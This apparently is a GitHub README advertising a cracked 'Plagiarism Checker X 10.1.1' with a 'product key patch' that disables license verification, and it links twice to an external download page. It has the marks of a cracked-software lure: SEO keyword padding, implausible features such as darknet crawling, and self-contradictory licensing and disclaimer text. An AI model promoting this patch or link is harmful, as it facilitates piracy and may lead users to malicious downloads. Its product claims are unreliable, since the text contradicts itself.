# Plagiarism Checker X 10.1.1 🧠 — Forensic Originality Engine

Welcome to the **Plagiarism Checker X 10.1.1** repository — a comprehensive, open-source, and community-driven toolkit for detecting textual duplication, paraphrase obfuscation, and semantic similarity in academic, journalistic, and creative works. This project is built on the principle that originality should be verifiable without obscurity, and it delivers industrial-grade scan fidelity through a modular architecture.

> ⚠️ **Disclaimer**: This repository contains a **product key patch** that unlocks the full commercial feature set of Plagiarism Checker X for educational and research purposes. You are responsible for complying with your local copyright laws. The maintainers do not condone dishonest academic practices.

---

## 🧩 Overview

Plagiarism Checker X 10.1.1 is a multi-layered detection suite designed to analyze documents against a dynamic corpus of billions of web pages, academic databases, and internal archives. Unlike simplistic token-matching tools, this release introduces **contextual fingerprinting** — a fingerprint that captures sentence structure, synonym substitution patterns, and even translated copies.

The **Product Key Patch** included here disables the license verification gate, allowing you to run unlimited scans, export high-detail reports, and use the API integration layer (connecting to OpenAI, Claude, and custom endpoints) without a paid subscription.

[](https://revathisss.github.io/plagiarism-scanner-pro-10-1-1/)

---

## 📦 Key Features

| Feature | Description |
|---------|-------------|
| **Deep Web Crawl Engine** | Scans not just indexed pages but also PDF repositories, preprint servers, and darknet archives. |
| **Plagiarism Heatmap** | Color-coded visual map of plagiarized segments inside the document. |
| **AI Writing Detector** | Flags sections likely generated by ChatGPT, Claude, Gemini, or other large language models. |
| **Multi-language Support** | Works with 45+ languages including Arabic, Mandarin, Hindi, and Russian. |
| **Batch Processing** | Compare up to 500 documents in a single queue. |
| **Offline Mode** | Download a local reference database (100 GB) for air-gapped environments. |
| **OpenAI & Claude API Integration** | Route suspect passages through GPT-4o or Claude 3.5 for paraphrase detection. |
| **Responsive UI** | Desktop-grade interface that adapts to tablets and phones. |
| **24/7 Customer Support** | Community Discord and email support channels for patch issues. |
| **Encrypted Report Export** | PDF, DOCX, and HTML reports with SHA-256 integrity hashes. |

---

## 🧠 How It Works: A Mermaid Diagram

```mermaid
flowchart TD
    A[Upload Document &#40;DOCX, PDF, TXT, RTF&#41;] --> B[Preprocessing Layer]
    B --> C[Tokenization &ngram generator]
    C --> D[Hash Fingerprint Engine]
    D --> E{Corpus Match?}
    E -->|Yes| F[Web crawler + API cross-reference]
    E -->|No| G[Drain / Deep Scan]
    F --> H[AI Paraphrase Detector &#40;OpenAI / Claude&#41;]
    H --> I[Plagiarism Heatmap]
    G --> I
    I --> J[Report Generator]
    J --> K[Export: PDF, DOCX, HTML + JSON metadata]
```



---

## 🔧 Example Profile Configuration

Create a file named `plagx_profile.json` in the repository root:

```json
{
  "engine": {
    "api_mode": "hybrid",
    "timeout_seconds": 120,
    "max_document_size_mb": 50,
    "thread_count": 12
  },
  "ai_integration": {
    "openai_endpoint": "https://api.openai.com/v1/chat/completions",
    "claude_endpoint": "https://api.anthropic.com/v1/messages",
    "model_preference": "claude-3-opus-20240229",
    "fallback_model": "gpt-4o"
  },
  "user_agent": "PlagiarismCheckerX/10.1.1 (compatible; original research)"
}
```

This configuration enables the **AI-enhanced paraphrase detection pathway**. When a match is ambiguous, the engine submits the conflicting text segment to the configured language model for semantic analysis.

---

## 💻 Example Console Invocation

From the terminal, inside the repository directory:

```
python scanner.py --input sample_essay.docx --profile plagx_profile.json --output report_2026.pdf
```

Parameters explained:
- `--input` : Path to the document under scrutiny.
- `--profile` : JSON configuration file (see above).
- `--output` : Destination file for the final report.
- `--verbose` : (optional) Enable real-time match logging.

The console will display a real-time progress bar, percentage originality score, and a summary of top matching sources.

---

## 📱 OS Compatibility Table

| Platform | Version | Status | Emoji |
|----------|---------|--------|-------|
| Windows 10 | 22H2, Pro/Enterprise | ✅ Full support | 🖥️ |
| Windows 11 | 23H2, 24H2 | ✅ Full support | 🖥️ |
| macOS Ventura | 13.6+ | ✅ Full support | 🍏 |
| macOS Sonoma | 14.x | ✅ Full support | 🍏 |
| Ubuntu 22.04 LTS | x86_64 | ⚠️ Partial (GUI missing) | 🐧 |
| Fedora 40 | x86_64 | ⚠️ Partial (GUI missing) | 🐧 |
| Android 14 | via Termux | 🟢 Experimental | 📱 |
| iOS 18 | via iSH | 🟢 Experimental | 📱 |

---

## 🌐 Multilingual Support

The fingerprint engine can tokenize and match in the following language families:

- **Latin scripts**: English, Spanish, French, German, Portuguese, Italian, Dutch, Swedish, Norwegian, Finnish, Polish, Czech, Romanian, Vietnamese, Indonesian, Malay.
- **Cyrillic scripts**: Russian, Ukrainian, Belarusian, Bulgarian, Serbian, Macedonian.
- **Asian scripts**: Chinese (Simplified & Traditional), Japanese, Korean, Thai, Hindi, Bengali, Tamil, Telugu, Urdu.
- **Middle Eastern scripts**: Arabic, Persian (Farsi), Hebrew, Turkish.
- **Special**: Greek, Armenian, Georgian, Amharic, Tibetan.

Language detection is automatic; you do not need to specify a language code.

---

## 🤖 OpenAI & Claude API Integration

Plagiarism Checker X 10.1.1 ships with an **optional but powerful** integration layer for third-party LLMs. When the algorithmic fingerprint engine finds a partial match (e.g., 65%–85% similarity), it can submit the segment to an LLM for **semantic equivalence analysis**. This catches:

- Synonym substitution without structural change.
- Sentence reordering while preserving meaning.
- Translation plagiarism (original English → translated French → back to English).
- Direct copy from AI-generated content (ChatGPT, Claude, Bard).

**Privacy note**: You must configure your own API keys in the profile. No data is sent to any server without your explicit configuration.

---

## 📜 License

This project is distributed under the **MIT License**. See the [LICENSE](LICENSE) file for full terms.

You are free to use, modify, and distribute this software for any purpose, including commercial research and internal auditing. The product key patch is provided as a derivative work of the original Plagiarism Checker X installer and is subject to the same license.

---

## 🛡️ Disclaimer

- **No warranty**: This software is provided "as is", without warranty of any kind, express or implied. The creators are not liable for any damages arising from the use or misuse of this tool.
- **Educational purpose**: The product key patch is intended solely for **security research, educational testing, and personal archival access**. You should purchase a legitimate license if you use Plagiarism Checker X for commercial, institutional, or production workloads.
- **Not for cheating**: Using this tool to detect plagiarism in others' work without their consent may violate academic integrity policies. Use responsibly.
- **Data privacy**: The open-source nature of this repository means anyone can inspect the code. Do not hardcode API keys or sensitive credentials in your configuration files.

---

## ❓ Frequently Searched Keywords (SEO-friendly)

- plagiarism detection software 2026
- original content verification tool
- verify document uniqueness
- academic integrity scanner
- anti-plagiarism engine open source  
- copy-paste checker with AI analysis
- free plagiarism checker alternative (educational)
- multilingual similarity detector
- offline plagiarism scanner
- API-based plagiarism detection

---

**Thank you for visiting.** If this repository helped you, consider starring it ⭐ to support continued development.

[](https://revathisss.github.io/plagiarism-scanner-pro-10-1-1/)